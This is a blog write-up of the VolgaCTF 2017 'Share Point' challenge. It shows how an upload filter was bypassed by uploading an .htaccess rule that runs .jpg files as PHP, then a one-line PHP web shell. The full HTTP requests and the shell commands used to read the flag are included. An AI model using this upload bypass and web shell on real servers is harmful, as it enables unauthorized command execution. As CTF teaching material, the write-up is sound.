<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | VolgaCTF - Share Point writeup"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | VolgaCTF - Share Point writeup"><meta name=twitter:title content="dubell.io | VolgaCTF - Share Point writeup"><meta itemprop=name content="dubell.io | VolgaCTF - Share Point writeup"><meta name=application-name content="dubell.io | VolgaCTF - Share Point writeup"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2017-03-28T00:00:00Z"><meta property="article:published_time" content="2017-03-28T00:00:00Z"><base href=https://dubell.io/www/2017/03/volgactf-share-point-writeup/><link rel=canonical href=https://dubell.io/www/2017/03/volgactf-share-point-writeup/ itemprop=url><meta name=url content="https://dubell.io/www/2017/03/volgactf-share-point-writeup/"><meta name=twitter:url content="https://dubell.io/www/2017/03/volgactf-share-point-writeup/"><meta property="og:url" content="https://dubell.io/www/2017/03/volgactf-share-point-writeup/"><meta name=description content><meta itemprop=description content><meta property="og:description" content><meta name=twitter:description content><meta itemprop=image content="/"><meta property="og:image" content="https://dubell.io"><meta name=twitter:image content="https://dubell.io"><meta name=twitter:image:src content="https://dubell.io"><meta property="og:updated_time" content="2017-03-28T00:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.iositemap.xml><title>dubell.io | VolgaCTF - Share Point writeup</title></head><body><div id=particles-js></div><main><div class=row><div class=col><header style=text-align:center><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></header></div></div><div class=row><div class=col style=text-align:center><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>VolgaCTF - Share Point writeup</h1><br><p class=small style=color:#999><a href=/categories/ctf>CTF</a> / March 28, 2017 â€¢ 2 min read</p><br><pre tabindex=0><code>Share Point

Look! I wrote a good service for sharing your files with your friends, enjoy)
share-point.quals.2017.volgactf.ru
</code></pre><p>The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.</p><p>Uploading files with a <code>.php</code> extension got rejected. I tried some tricks when trying to upload my <code>shell.php</code>:</p><ul><li>Chaning the Content Type to <code>image/jpeg</code>.</li><li>Injecting null values in the filename <code>shell.php\00.gif</code>.</li><li>Uploading a file with the magic headers of a gif file.</li></ul><p>Next I tried to upload an <code>.htaccess</code> file with the following contents <code>AddType application/x-httpd-php .jpg</code>, this would cause <code>.jpg</code> files to executed as <code>.php</code> files, and it worked!</p><p>The following code snippet shows the HTTP POST request from Burp Suite when uploading the <code>.htaccess</code> file and the following <code>shell.php.jpg</code>.</p><pre tabindex=0><code>POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 271
Content-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------1620217569904038223723611436
Content-Disposition: form-data; name=&#34;userFile&#34;; filename=&#34;.htaccess&#34;
Content-Type: application/octet-stream

AddType application/x-httpd-php .jpg

-----------------------------1620217569904038223723611436--
</code></pre><pre tabindex=0><code>POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 256
Content-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------5375118911646132755521388984
Content-Disposition: form-data; name=&#34;userFile&#34;; filename=&#34;shell.php.jpg&#34;
Content-Type: image/jpeg

&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;

-----------------------------5375118911646132755521388984--
</code></pre><p>Once we have uploaded the shell, we can start looking for the flag on the file system.</p><pre tabindex=0><code>http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah

total 24K
drwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .
drwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..
-rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess
-rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg
</code></pre><p>By pure luck I checked the <code>/opt/</code> folder and found <code>flag.txt</code>. Otherwise I would have simply searched for &ldquo;flag&rdquo;.</p><pre tabindex=0><code>http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt
VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}
</code></pre></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script></body></html>